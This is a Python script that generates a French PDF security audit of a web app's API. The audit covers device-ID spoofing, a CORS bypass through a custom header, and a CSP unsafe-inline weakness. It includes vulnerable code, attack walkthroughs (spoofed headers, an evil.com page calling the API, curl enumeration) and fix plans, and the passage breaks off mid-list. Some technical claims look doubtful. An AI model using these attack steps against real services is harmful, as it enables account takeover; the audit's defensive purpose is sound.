#!/usr/bin/env python3
"""Generate VirtuMatch Security Audit PDF — V-01, V-02, V-03 (Read-Only Phase 1)"""

import os
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm, cm
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_JUSTIFY
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    PageBreak, KeepTogether, HRFlowable, ListFlowable, ListItem,
)
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.pdfbase.pdfmetrics import registerFontFamily

# ── Font Registration ──────────────────────────────────────────────
FONT_DIR = '/usr/share/fonts'

pdfmetrics.registerFont(TTFont('NotoSerifSC', f'{FONT_DIR}/truetype/noto-serif-sc/NotoSerifSC-Regular.ttf'))
pdfmetrics.registerFont(TTFont('NotoSerifSC-Bold', f'{FONT_DIR}/truetype/noto-serif-sc/NotoSerifSC-Bold.ttf'))
pdfmetrics.registerFont(TTFont('NotoSerifSC-SemiBold', f'{FONT_DIR}/truetype/noto-serif-sc/NotoSerifSC-SemiBold.ttf'))
pdfmetrics.registerFont(TTFont('NotoSerifSC-Medium', f'{FONT_DIR}/truetype/noto-serif-sc/NotoSerifSC-Medium.ttf'))
registerFontFamily('NotoSerifSC', normal='NotoSerifSC', bold='NotoSerifSC-Bold')

# Variable font not compatible with ReportLab — use NotoSerifSC for all Chinese text
# pdfmetrics.registerFont(TTFont('NotoSansSC', f'{FONT_DIR}/truetype/chinese/NotoSansSC[wght].ttf'))

pdfmetrics.registerFont(TTFont('DejaVuSans', f'{FONT_DIR}/truetype/dejavu/DejaVuSans.ttf'))
pdfmetrics.registerFont(TTFont('DejaVuSansBold', f'{FONT_DIR}/truetype/dejavu/DejaVuSans-Bold.ttf'))
pdfmetrics.registerFont(TTFont('DejaVuSansMono', f'{FONT_DIR}/truetype/dejavu/DejaVuSansMono.ttf'))
registerFontFamily('DejaVuSans', normal='DejaVuSans', bold='DejaVuSansBold')

# ── Color Palette (Cascade V2 — "Security Audit") ─────────────────
PAGE_BG       = colors.HexColor('#f7f7f5')
SECTION_BG    = colors.HexColor('#e9e9e6')
CARD_BG       = colors.HexColor('#eae9e7')
TABLE_STRIPE  = colors.HexColor('#f2f2f0')
HEADER_FILL   = colors.HexColor('#1a1a2e')
COVER_BLOCK   = colors.HexColor('#6c5ce7')
BORDER        = colors.HexColor('#c6bfa7')
ACCENT        = colors.HexColor('#6c5ce7')
ACCENT_2      = colors.HexColor('#e17055')
TEXT_PRIMARY   = colors.HexColor('#1a1a2e')
TEXT_MUTED     = colors.HexColor('#636e72')
SEM_SUCCESS   = colors.HexColor('#00b894')
SEM_WARNING   = colors.HexColor('#fdcb6e')
SEM_ERROR     = colors.HexColor('#d63031')
SEM_INFO      = colors.HexColor('#0984e3')
CRITICAL_BG   = colors.HexColor('#ffeaa7')
CRITICAL_BORDER = colors.HexColor('#d63031')
HIGH_BG       = colors.HexColor('#fab1a0')
HIGH_BORDER   = colors.HexColor('#e17055')
CODE_BG       = colors.HexColor('#2d3436')
CODE_TEXT      = colors.HexColor('#dfe6e9')

# ── Styles ─────────────────────────────────────────────────────────
styles = getSampleStyleSheet()

s_title = ParagraphStyle(
    'AuditTitle', parent=styles['Title'],
    fontName='NotoSerifSC-Bold', fontSize=28, leading=34,
    textColor=TEXT_PRIMARY, alignment=TA_CENTER, spaceAfter=6*mm,
)
s_subtitle = ParagraphStyle(
    'AuditSubtitle', parent=styles['Normal'],
    fontName='NotoSerifSC', fontSize=14, leading=18,
    textColor=TEXT_MUTED, alignment=TA_CENTER, spaceAfter=10*mm,
)
s_h1 = ParagraphStyle(
    'H1', parent=styles['Heading1'],
    fontName='NotoSerifSC-Bold', fontSize=20, leading=26,
    textColor=HEADER_FILL, spaceBefore=12*mm, spaceAfter=4*mm,
    borderWidth=0, borderColor=ACCENT, borderPadding=0,
)
s_h2 = ParagraphStyle(
    'H2', parent=styles['Heading2'],
    fontName='NotoSerifSC-Bold', fontSize=15, leading=20,
    textColor=ACCENT, spaceBefore=8*mm, spaceAfter=3*mm,
)
s_h3 = ParagraphStyle(
    'H3', parent=styles['Heading3'],
    fontName='NotoSerifSC-SemiBold', fontSize=12, leading=16,
    textColor=TEXT_PRIMARY, spaceBefore=5*mm, spaceAfter=2*mm,
)
s_body = ParagraphStyle(
    'Body', parent=styles['Normal'],
    fontName='NotoSerifSC', fontSize=10, leading=16,
    textColor=TEXT_PRIMARY, alignment=TA_JUSTIFY, spaceAfter=3*mm,
)
s_body_indent = ParagraphStyle(
    'BodyIndent', parent=s_body,
    leftIndent=8*mm,
)
s_code = ParagraphStyle(
    'Code', parent=styles['Code'],
    fontName='DejaVuSansMono', fontSize=8, leading=11,
    textColor=CODE_TEXT, backColor=CODE_BG,
    leftIndent=4*mm, rightIndent=4*mm,
    spaceBefore=2*mm, spaceAfter=2*mm,
    borderWidth=0.5, borderColor=colors.HexColor('#636e72'),
    borderPadding=4,
)
s_bullet = ParagraphStyle(
    'Bullet', parent=s_body,
    leftIndent=12*mm, bulletIndent=6*mm,
    spaceBefore=1*mm, spaceAfter=1*mm,
)
s_table_header = ParagraphStyle(
    'TableHeader', fontName='NotoSerifSC-Bold', fontSize=9, leading=12,
    textColor=colors.white, alignment=TA_CENTER,
)
s_table_cell = ParagraphStyle(
    'TableCell', fontName='NotoSerifSC', fontSize=9, leading=12,
    textColor=TEXT_PRIMARY, alignment=TA_LEFT,
)
s_table_cell_center = ParagraphStyle(
    'TableCellCenter', parent=s_table_cell, alignment=TA_CENTER,
)
s_severity_critical = ParagraphStyle(
    'SeverityCritical', fontName='NotoSerifSC-Bold', fontSize=9, leading=12,
    textColor=SEM_ERROR, alignment=TA_CENTER,
)
s_severity_high = ParagraphStyle(
    'SeverityHigh', fontName='NotoSerifSC-Bold', fontSize=9, leading=12,
    textColor=ACCENT_2, alignment=TA_CENTER,
)
s_caption = ParagraphStyle(
    'Caption', parent=s_body,
    fontName='NotoSerifSC', fontSize=8, leading=11,
    textColor=TEXT_MUTED, alignment=TA_CENTER,
    spaceBefore=1*mm, spaceAfter=3*mm,
)
s_attack_title = ParagraphStyle(
    'AttackTitle', fontName='NotoSerifSC-Bold', fontSize=10, leading=14,
    textColor=SEM_ERROR, spaceBefore=3*mm, spaceAfter=1*mm,
)

# ── Helper Functions ───────────────────────────────────────────────
def make_table(headers, rows, col_widths=None):
    """Create a styled table with header row."""
    header_cells = [Paragraph(h, s_table_header) for h in headers]
    data = [header_cells]
    for row in rows:
        data.append([Paragraph(str(c), s_table_cell) if not isinstance(c, Paragraph) else c for c in row])
    
    if col_widths is None:
        col_widths = [None] * len(headers)
    
    t = Table(data, colWidths=col_widths, repeatRows=1)
    style_cmds = [
        ('BACKGROUND', (0, 0), (-1, 0), HEADER_FILL),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('FONTNAME', (0, 0), (-1, 0), 'NotoSerifSC-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 9),
        ('ALIGN', (0, 0), (-1, 0), 'CENTER'),
        ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#b2bec3')),
        ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.white, TABLE_STRIPE]),
        ('TOPPADDING', (0, 0), (-1, -1), 4),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 4),
        ('LEFTPADDING', (0, 0), (-1, -1), 6),
        ('RIGHTPADDING', (0, 0), (-1, -1), 6),
    ]
    t.setStyle(TableStyle(style_cmds))
    return t

def severity_badge(severity):
    if severity == 'CRITIQUE':
        return Paragraph('CRITIQUE', s_severity_critical)
    elif severity == 'HAUTE':
        return Paragraph('HAUTE', s_severity_high)
    return Paragraph(severity, s_table_cell_center)

def bullet(text):
    return Paragraph(f'<bullet>&bull;</bullet>{text}', s_bullet)

def code_block(text):
    return Paragraph(text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;'), s_code)

def hr():
    return HRFlowable(width='100%', thickness=0.5, color=BORDER, spaceBefore=3*mm, spaceAfter=3*mm)

# ── Build Document ─────────────────────────────────────────────────
OUTPUT_DIR = '/home/z/my-project/download'
os.makedirs(OUTPUT_DIR, exist_ok=True)
OUTPUT_PATH = os.path.join(OUTPUT_DIR, 'audit-securite-virtumatch-V01-V02-V03.pdf')

doc = SimpleDocTemplate(
    OUTPUT_PATH,
    pagesize=A4,
    leftMargin=20*mm, rightMargin=20*mm,
    topMargin=18*mm, bottomMargin=18*mm,
    title='Audit de Securite VirtuMatch — V-01, V-02, V-03',
    author='Z.ai Security Audit',
    subject='Phase 1: Audit en lecture seule des vulnerabilites critiques',
)

story = []

# ═══════════════════════════════════════════════════════════════════
# COVER / TITLE
# ═══════════════════════════════════════════════════════════════════
story.append(Spacer(1, 30*mm))
story.append(Paragraph('VirtuMatch Predictor', s_title))
story.append(Paragraph('Audit de Securite — Phase 1 (Lecture Seule)', ParagraphStyle(
    'CoverSub', parent=s_subtitle, fontSize=16, leading=20, textColor=ACCENT,
)))
story.append(Spacer(1, 6*mm))
story.append(HRFlowable(width='60%', thickness=2, color=ACCENT, spaceBefore=0, spaceAfter=6*mm))
story.append(Paragraph('Vulnerabilites V-01, V-02, V-03 — Analyse, Flux d\'Attaque, Plan de Correction', ParagraphStyle(
    'CoverDesc', parent=s_body, fontSize=12, leading=18, alignment=TA_CENTER, textColor=TEXT_PRIMARY,
)))
story.append(Spacer(1, 10*mm))

# Severity summary table on cover
cover_data = [
    [Paragraph('V-01', s_table_cell_center), severity_badge('CRITIQUE'),
     Paragraph('Usurpation d\'identite appareil via x-device-id sans HMAC', s_table_cell)],
    [Paragraph('V-02', s_table_cell_center), severity_badge('CRITIQUE'),
     Paragraph('Contournement CORS via x-capacitor-request controllable par l\'attaquant', s_table_cell)],
    [Paragraph('V-03', s_table_cell_center), severity_badge('CRITIQUE'),
     Paragraph('CSP unsafe-inline neutralise la protection XSS du navigateur', s_table_cell)],
]
cover_table = Table(cover_data, colWidths=[25*mm, 25*mm, 100*mm])
cover_table.setStyle(TableStyle([
    ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#b2bec3')),
    ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
    ('TOPPADDING', (0, 0), (-1, -1), 6),
    ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
    ('LEFTPADDING', (0, 0), (-1, -1), 6),
    ('RIGHTPADDING', (0, 0), (-1, -1), 6),
    ('ROWBACKGROUNDS', (0, 0), (-1, -1), [colors.HexColor('#ffeaa7'), colors.HexColor('#fab1a0'), colors.HexColor('#fab1a0')]),
]))
story.append(cover_table)

story.append(Spacer(1, 15*mm))
story.append(Paragraph('Date : 9 septembre 2026 | Repository : HITIFok/remix-of-virtumatch-predictor-86', ParagraphStyle(
    'CoverMeta', parent=s_body, fontSize=9, leading=13, alignment=TA_CENTER, textColor=TEXT_MUTED,
)))
story.append(Paragraph('Classification : CONFIDENTIEL — Ne pas distribuer sans autorisation', ParagraphStyle(
    'CoverConf', parent=s_body, fontSize=9, leading=13, alignment=TA_CENTER, textColor=SEM_ERROR,
)))

story.append(PageBreak())

# ═══════════════════════════════════════════════════════════════════
# TABLE OF CONTENTS
# ═══════════════════════════════════════════════════════════════════
story.append(Paragraph('Table des Matieres', s_h1))
toc_items = [
    '1. Resume Executif',
    '2. Perimetre de l\'Audit',
    '3. V-01 — Usurpation d\'Identite Appareil (requireAuth fallback)',
    '   3.1 Fichiers Concernes',
    '   3.2 Flux d\'Attaque',
    '   3.3 Plan de Correction',
    '4. V-02 — Contournement CORS (x-capacitor-request)',
    '   4.1 Fichiers Concernes',
    '   4.2 Flux d\'Attaque',
    '   4.3 Plan de Correction',
    '5. V-03 — CSP unsafe-inline (XSS enable)',
    '   5.1 Fichiers Concernes',
    '   5.2 Flux d\'Attaque',
    '   5.3 Plan de Correction',
    '6. Matrice de Severite et Priorisation',
    '7. Strategie de Migration HMAC',
    '8. Ordre d\'Execution des Phases (A-T)',
]
for item in toc_items:
    indent = 0
    if item.startswith('   '):
        indent = 8*mm
        item = item.strip()
    style = ParagraphStyle('TOCItem', parent=s_body, fontSize=10, leftIndent=indent, spaceAfter=1.5*mm)
    story.append(Paragraph(item, style))

story.append(PageBreak())

# ═══════════════════════════════════════════════════════════════════
# 1. RESUME EXECUTIF
# ═══════════════════════════════════════════════════════════════════
story.append(Paragraph('1. Resume Executif', s_h1))
story.append(Paragraph(
    'Cet audit en lecture seule (Phase 1) analyse trois vulnerabilites critiques identifiees dans le repository VirtuMatch Predictor. '
    'L\'objectif est de documenter les fichiers concernes, les flux d\'attaque complets et les plans de correction detailles '
    'avant toute modification du code source. Cette approche garantit que les decisions de remediation sont prises '
    'sur la base d\'une analyse approfondie plutot que d\'une reaction impulse.',
    s_body
))
story.append(Paragraph(
    'Les trois vulnerabilites partagent une caracteristique commune : elles constituent des frontieres de confiance implicites '
    'qui n\'ont pas ete remplacees par des mecanismes cryptographiques ou des validations robustes. V-01 fait confiance '
    'a un en-tete HTTP sans verification HMAC, V-02 fait confiance a un en-tete definissable par le client pour des decisions CORS, '
    'et V-03 fait confiance au navigateur pour bloquer les scripts inline malgre la directive <b>unsafe-inline</b> qui desactive '
    'explicitement cette protection. Dans les trois cas, la remediation consiste a remplacer la confiance implicite par une '
    'verification explicite et cryptographiquement securisee.',
    s_body
))
story.append(Paragraph(
    'L\'architecture du projet inclut deja des mecanismes de defense solides : authentification HMAC pour les appareils '
    'enregistres (HMAC-SHA256 avec timing-safe comparison), tokens de session utilisateur signes (magic link), '
    'rate limiting par IP (Edge middleware + in-handler), protection SSRF par whitelist de league IDs, '
    'et requetes SQL parameterisees via postgres tagged templates. Cependant, les fallbacks de compatibilite et les '
    'relaxations de securite (unsafe-inline, x-capacitor-request bypass) creent des chemins d\'attaque exploitables '
    'qui contournent ces mecanismes existants.',
    s_body
))

story.append(Paragraph(
    '<b>Principe directeur :</b> Aucune modification du moteur de prediction ne doit etre effectuee avant que les trois vulnerabilites '
    'critiques ne soient entierement remediees et validees par des tests de securite. Cet ordre est non-negociable et correspond '
    'aux phases A (Securite), B (Tests Securite), C (CSP), D (Tests Securite post-CSP) du plan en 20 phases.',
    s_body
))

# ═══════════════════════════════════════════════════════════════════
# 2. PERIMETRE
# ═══════════════════════════════════════════════════════════════════
story.append(Paragraph('2. Perimetre de l\'Audit', s_h1))
story.append(Paragraph(
    'L\'audit couvre les fichiers serveur et client directement impliques dans les trois vulnerabilites. '
    'L\'analyse est effectuee sur le code source du repository GitHub HITIFok/remix-of-virtumatch-predictor-86, '
    'branche principale, au 9 septembre 2026. Les fichiers de base de donnees (SQL migrations), les scripts Python existants, '
    'et les archives de logs sont exclus du perimetre direct mais sont references lorsque necessaire.',
    s_body
))

scope_data = [
    ['Fichier', 'Role', 'Vulnerabilite(s)'],
    ['api/_lib/auth.js', 'Auth principale (requireAuth, verifyDeviceToken)', 'V-01'],
    ['api/_lib/cors.js', 'CORS (isOriginAllowed, x-capacitor-request)', 'V-02'],
    ['api/predictions.js', 'CRUD predictions (requireAuth)', 'V-01'],
    ['api/verify-predictions.js', 'Verification predictions (requireAuth)', 'V-01'],
    ['api/premium-activate.js', 'Activation premium (requireAuth)', 'V-01'],
    ['api/analyze-match.js', 'Analyse IA match (requireAuth)', 'V-01'],
    ['api/auth.js', 'Magic link auth (x-device-id dans migrate)', 'V-01'],
    ['api/device-register.js', 'Enregistrement appareil HMAC', 'V-01'],
    ['api/early-alerts.js', 'Alertes precoces (admin token)', 'V-02'],
    ['api/admin-codes.js', 'Admin unifie (origin check)', 'V-02'],
    ['vercel.json', 'CSP, HSTS, security headers', 'V-03'],
    ['index.html', 'Point d\'entree SPA (inline scripts)', 'V-03'],
    ['src/lib/device.ts', 'Client device ID + HMAC token', 'V-01'],
    ['middleware.js', 'Edge rate limiting', 'V-02'],
]

scope_table = make_table(
    scope_data[0],
    scope_data[1:],
    col_widths=[55*mm, 55*mm, 30*mm]
)
story.append(scope_table)
story.append(Paragraph('Tableau 1 : Fichiers dans le perimetre de l\'audit', s_caption))

# ═══════════════════════════════════════════════════════════════════
# 3. V-01
# ═══════════════════════════════════════════════════════════════════
story.append(Paragraph('3. V-01 — Usurpation d\'Identite Appareil via requireAuth() Fallback', s_h1))

story.append(Paragraph(
    'La vulnerabilite V-01 reside dans la fonction <b>requireAuth()</b> du module <b>api/_lib/auth.js</b>. '
    'Cette fonction implemente une logique d\'authentification a deux niveaux : elle tente d\'abord la verification '
    'HMAC via <b>verifyDeviceToken()</b>, puis, en cas d\'echec, accepte un identifiant d\'appareil en clair via trois '
    'vecteurs differentes. Ce fallback de compatibilite, bien que necessaire pendant la migration vers HMAC, '
    'permet a un attaquant de se faire passer pour n\'importe quel appareil sans connaissance de secret cryptographique.',
    s_body
))

# 3.1 Fichiers
story.append(Paragraph('3.1 Fichiers Concernes', s_h2))

story.append(Paragraph(
    'Le fichier principal est <b>api/_lib/auth.js</b>, qui contient la fonction requireAuth() aux lignes 192-222. '
    'Les fallbacks acceptent l\'identifiant appareil depuis trois sources distinctes, ce qui multiplie les vecteurs d\'attaque. '
    'Chaque route API qui appelle requireAuth() herite de cette vulnerabilite par composition.',
    s_body
))

v01_files_data = [
    ['api/_lib/auth.js', 'Lignes 192-222', 'requireAuth() fallback x-device-id, body.device_id, query.device_id'],
    ['api/predictions.js', 'Ligne 204, 257, 360', 'Appelle requireAuth() pour GET/POST/DELETE predictions'],
    ['api/verify-predictions.js', 'Ligne 303', 'Appelle requireAuth() en mode client (non-cron)'],
    ['api/premium-activate.js', 'Variable', 'Appelle requireAuth() pour activation premium legacy'],
    ['api/analyze-match.js', 'Variable', 'Appelle requireAuth() pour analyse IA'],
    ['api/auth.js', 'Ligne migrate', 'Lit x-device-id directement pour purpose=migrate'],
    ['api/device-register.js', 'Ligne 45', 'Lit x-device-id pour enregistrement initial'],
    ['src/lib/device.ts', 'getAuthHeaders()', 'Client : fallback x-device-id si HMAC non disponible'],
]
story.append(make_table(
    ['Fichier', 'Ligne(s)', 'Impact'],
    v01_files_data,
    col_widths=[45*mm, 30*mm, 95*mm]
))
story.append(Paragraph('Tableau 2 : Fichiers affectes par V-01', s_caption))

story.append(Paragraph(
    'Le code vulnerablable exact dans requireAuth() est le suivant. Apres l\'echec de verifyDeviceToken(), '
    'la fonction accepte inconditionnellement tout device_id correspondant au regex /^dev-[a-z0-9]{8,}$/ '
    'sans aucune verification de secret. Le regex est deterministe et l\'espace de device_id est petit '
    '(36^8 = 2.8 x 10<super>12</super> combinaisons theoriques, mais en pratique l\'empreinte djb2 reduit '
    'drastiquement l\'entropie reelle).',
    s_body
))

story.append(code_block(
    '// api/_lib/auth.js — Lignes 192-222 (VULNERABLE FALLBACK)\n'
    'export async function requireAuth(req) {\n'
    '  // First, try the new HMAC token auth\n'
    '  const result = await verifyDeviceToken(req);\n'
    '  if (result.valid) return result.deviceId;\n'
    '\n'
    '  // BACKWARD COMPAT: plain device_id accepted without secret\n'
    '  const plainDeviceId = req.headers[\'x-device-id\'] || \'\';\n'
    '  if (plainDeviceId && DEVICE_ID_RE.test(plainDeviceId)) {\n'
    '    console.warn(`[auth] FALLBACK: plain device_id accepted`);\n'
    '    return plainDeviceId;  // <-- ANY valid device_id is trusted!\n'
    '  }\n'
    '\n'
    '  // Also check body.device_id (legacy POST)\n'
    '  // Also check query.device_id (legacy GET)\n'
    '  // ... same pattern, no secret verification\n'
    '}'
))

# 3.2 Flux d'Attaque
story.append(Paragraph('3.2 Flux d\'Attaque', s_h2))

story.append(Paragraph(
    'Le flux d\'attaque exploite le fallback de requireAuth() en contournant entierement la verification HMAC. '
    'L\'attaquant n\'a besoin que de connaitre (ou deviner) un device_id valide, ce qui est trivial car le format '
    'est deterministe (djb2 hash de fingerprint navigateur) et l\'empreinte est souvent predictable a partir '
    'des caracteristiques publiques du navigateur de la victime (resolution d\'ecran, langue, plateforme, fuseau horaire).',
    s_body
))

story.append(Paragraph('Scenario d\'attaque — Usurpation complete d\'identite', s_attack_title))

attack_steps = [
    '<b>Reconnaissance :</b> L\'attaquant visite le site VirtuMatch depuis le meme navigateur (ou un navigateur simulant les memes caracteristiques) que la victime. Le client JavaScript genere un device_id deterministe via djb2 hash des fingerprints (screen.width, screen.height, navigator.platform, navigator.language, Intl.DateTimeFormat().resolvedOptions().timeZone). L\'attaquant observe son propre device_id et infere celui de la victime (meme resolution, meme langue, meme fuseau).',
    '<b>Selection de cible :</b> L\'attaquant construit un device_id cible (par exemple "dev-a3b7c9d2") correspondant aux fingerprints de la victime. Avec 8 caracteres hexadecimaux et une fonction djb2 deterministe, l\'espace est petit et les collisions de fingerprint sont probables entre utilisateurs de la meme region.',
    '<b>Contournement HMAC :</b> L\'attaquant envoie une requete HTTP directement au endpoint API (par exemple POST /api/predictions) avec l\'en-tete x-device-id: dev-a3b7c9d2. Il ne fournit PAS d\'en-tete Authorization: Device (pas de token HMAC). verifyDeviceToken() echoue (pas d\'en-tete Authorization), puis requireAuth() execute le fallback et accepte le device_id en clair.',
    '<b>Exploitation :</b> L\'attaquant obtient un acces complet au compte de la victime : lecture de toutes les predictions (GET /api/predictions), creation de predictions frauduleuses (POST /api/predictions avec device_id de la victime), suppression de predictions (DELETE /api/predictions), et potentiellement activation premium si le device_id a des droits premium.',
    '<b>Persistance :</b> L\'attaquant peut automatiser cette attaque a grande echelle en enumerant les device_id probables (empreintes de fingerprint courantes : 1920x1080, 1366x768, langue "fr", timezone "Indian/Antananarivo"). Chaque device_id valide donne acces au compte d\'un utilisateur reel.',
]
for step in attack_steps:
    story.append(bullet(step))

story.append(Paragraph(
    '<b>Impact CVSS estime :</b> CVSS 3.1 Score 9.1 (Critical). Vecteur : AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N. '
    'L\'attaquant peut lire toutes les donnees de la victime (C:H) et modifier/supprimer ses predictions (I:H) '
    'sans aucune authentification (PR:N) ni interaction utilisateur (UI:N). La complexite d\'attaque est basse (AC:L) '
    'car le device_id est predictable.',
    s_body
))

# 3.3 Plan de Correction
story.append(Paragraph('3.3 Plan de Correction', s_h2))

story.append(Paragraph(
    'La correction de V-01 suit une strategie de migration progressive avec feature flag, afin de ne pas casser '
    'les clients existants (APK non mis a jour) pendant la periode de transition. Le plan comporte quatre etapes '
    'qui correspondent aux phases A, B, et D du plan global.',
    s_body
))

story.append(Paragraph('Etape 1 : Activation du feature flag HMAC_ONLY (Phase A)', s_h3))
story.append(Paragraph(
    'Ajouter une variable d\'environnement HMAC_ONLY=true qui, lorsqu\'elle est activee, supprime les trois fallbacks '
    'dans requireAuth() (x-device-id header, body.device_id, query.device_id). Lorsque HMAC_ONLY=false (defaut pendant '
    'la migration), les fallbacks restent actifs mais avec des restrictions supplementaires : logging obligatoire '
    'de chaque utilisation du fallback (deja en place via console.warn), limitation de duree de validite du fallback '
    '(timestamp dans un cookie ou en-tete secondaire), et restriction des endpoints accessibles via fallback '
    '(par exemple, interdire DELETE via fallback).',
    s_body
))

story.append(code_block(
    '// Correction : requireAuth() avec feature flag HMAC_ONLY\n'
    'export async function requireAuth(req) {\n'
    '  const result = await verifyDeviceToken(req);\n'
    '  if (result.valid) return result.deviceId;\n'
    '\n'
    '  if (process.env.HMAC_ONLY === \'true\') {\n'
    '    // Migration complete : fallback DESACTIVE\n'
    '    return null;\n'
    '  }\n'
    '\n'
    '  // Migration en cours : fallback RESTREINT\n'
    '  const plainDeviceId = req.headers[\'x-device-id\'] || \'\';\n'
    '  if (plainDeviceId && DEVICE_ID_RE.test(plainDeviceId)) {\n'
    '    // RESTRICTION: interdire DELETE via fallback\n'
    '    if (req.method === \'DELETE\') return null;\n'
    '    console.warn(`[auth] FALLBACK: ${plainDeviceId} (${req.method})`);\n'
    '    return plainDeviceId;\n'
    '  }\n'
    '  return null;\n'
    '}'
))

story.append(Paragraph('Etape 2 : Tests de securite automatises (Phase B)', s_h3))
story.append(Paragraph(
    'Creer des tests Jest/Vitest qui verifient : (a) requireAuth() rejette les requetes sans token HMAC quand HMAC_ONLY=true, '
    '(b) requireAuth() accepte les tokens HMAC valides dans tous les modes, (c) requireAuth() rejette les tokens expires, '
    '(d) requireAuth() rejette les tokens avec signature invalide (timing-safe), (e) les routes protegees (predictions, '
    'premium-activate, analyze-match) retournent 401 sans authentification valide, (f) le fallback est bien restreint '
    'aux methodes non-destructives quand HMAC_ONLY=false. Ces tests doivent etre executes dans le pipeline CI/CD '
    'avant tout deploiement.',
    s_body
))

story.append(Paragraph('Etape 3 : Mise a jour du client et periode de migration', s_h3))
story.append(Paragraph(
    'L\'APK et le client web doivent etre mis a jour pour utiliser exclusivement getAuthHeaders() qui envoie le token HMAC '
    'dans l\'en-tete Authorization: Device. Le client src/lib/device.ts implemente deja cette logique (fonction getAuthHeaders() '
    'qui privilegie le Bearer token utilisateur, puis le token HMAC appareil, avec fallback x-device-id). Apres deploiement '
    'de l\'APK mis a jour, une periode de 2 semaines est necessaire pour que tous les utilisateurs actifs mettent a jour '
    'leur application. Pendant cette periode, HMAC_ONLY reste a false.',
    s_body
))

story.append(Paragraph('Etape 4 : Desactivation du fallback (Phase D)', s_h3))
story.append(Paragraph(
    'Apres la periode de migration (2 semaines post-APK), activer HMAC_ONLY=true en production. Les logs de fallback '
    '(console.warn) sont analyses pour verifier que plus aucune requete n\'utilise le chemin legacy. Si des requetes '
    'legacy persistent, investiger avant desactivation. Une fois HMAC_ONLY=true, supprimer le code de fallback '
    'entierement du fichier auth.js pour eliminer la surface d\'attaque.',
    s_body
))

# ═══════════════════════════════════════════════════════════════════
# 4. V-02
# ═══════════════════════════════════════════════════════════════════
story.append(Paragraph('4. V-02 — Contournement CORS via x-capacitor-request', s_h1))

story.append(Paragraph(
    'La vulnerabilite V-02 reside dans la fonction <b>isOriginAllowed()</b> du module <b>api/_lib/cors.js</b>. '
    'Cette fonction verifie l\'origine d\'une requete pour determiner si elle est autorisee a acceder a l\'API. '
    'Cependant, elle accorde une confiance totale a l\'en-tete <b>x-capacitor-request</b> : si cet en-tete est present, '
    'la fonction retourne true sans aucune verification supplementaire, contournant entierement la logique de whitelist '
    'd\'origines. Comme cet en-tete est definissable par n\'importe quel client HTTP (curl, fetch, XMLHttpRequest), '
    'un site web malveillant peut l\'ajouter a ses requetes cross-origin pour bypasser la protection CORS.',
    s_body
))

# 4.1 Fichiers
story.append(Paragraph('4.1 Fichiers Concernes', s_h2))

v02_files_data = [
    ['api/_lib/cors.js', 'Ligne 19', 'isOriginAllowed() : x-capacitor-request retourne true sans verification'],
    ['api/predictions.js', 'Ligne 161', 'setCorsHeaders() appel en debut de handler'],
    ['api/verify-predictions.js', 'Ligne 264', 'setCorsHeaders() appel'],
    ['api/auth.js', 'Ligne variable', 'setCorsHeaders() appel'],
    ['api/admin-codes.js', 'Ligne variable', 'setCorsHeaders() + isOriginAllowed() pour login'],
    ['api/device-register.js', 'Ligne 31', 'setCorsHeaders() appel'],
    ['api/premium-activate.js', 'Ligne variable', 'setCorsHeaders() appel'],
    ['api/early-alerts.js', 'Ligne 38', 'setCorsHeaders() appel'],
    ['api/analyze-match.js', 'Ligne variable', 'setCorsHeaders() appel'],
    ['middleware.js', 'Global', 'Rate limiting mais PAS de validation d\'en-tete capacitor'],
]
story.append(make_table(
    ['Fichier', 'Ligne(s)', 'Impact'],
    v02_files_data,
    col_widths=[45*mm, 25*mm, 100*mm]
))
story.append(Paragraph('Tableau 3 : Fichiers affectes par V-02', s_caption))

story.append(code_block(
    '// api/_lib/cors.js — Ligne 19 (VULNERABLE)\n'
    'export function isOriginAllowed(origin, reqHost, reqHeaders) {\n'
    '  // 0. Capacitor native app: custom header\n'
    '  if (reqHeaders?.[\'x-capacitor-request\']) return true; // <-- BYPASS!\n'
    '\n'
    '  // 1. Exact match against allowed list\n'
    '  if (ALLOWED_ORIGINS.includes(origin)) return true;\n'
    '  // ...\n'
    '}'
))

# 4.2 Flux d'Attaque
story.append(Paragraph('4.2 Flux d\'Attaque', s_h2))

story.append(Paragraph('Scenario d\'attaque — Site web malveillant appelant l\'API', s_attack_title))

v02_steps = [
    '<b>Preparation :</b> L\'attaquant cree un site web malveillant (evil.com) qui contient du JavaScript client. Ce site est heberge sur un serveur controle par l\'attaquant et accessible publiquement. L\'attaquant n\'a besoin d\'aucun acces au serveur VirtuMatch.',
    '<b>Envoi de requete cross-origin :</b> Le JavaScript sur evil.com effectue un fetch() vers https://virtual-match-hitifproject.vercel.app/api/predictions. Normalement, le navigateur envoie une requete OPTIONS preflight avec Origin: https://evil.com. Le serveur VirtuMatch verifierait isOriginAllowed("https://evil.com", ...) et, sans le bypass, retournerait false car evil.com n\'est pas dans la whitelist.',
    '<b>Ajout de l\'en-tete bypass :</b> L\'attaquant ajoute simplement x-capacitor-request: true a ses requetes fetch. Bien que les navigateurs n\'autorisent pas les applications web a definir des en-tetes non-standards sans preflight, le preflight OPTIONS lui-meme peut inclure cet en-tete via Access-Control-Request-Headers. Si le serveur repond favorablement au preflight (ce qu\'il fait grace au bypass), le navigateur autorise la requete subsequente.',
    '<b>Alternative curl :</b> L\'attaquant peut aussi utiliser curl ou tout client HTTP hors-navigateur pour envoyer des requetes avec x-capacitor-request: true directement. Le navigateur n\'est pas implique dans cette variante, ce qui rend l\'attaque encore plus simple et applicable aux scripts d\'enumeration.',
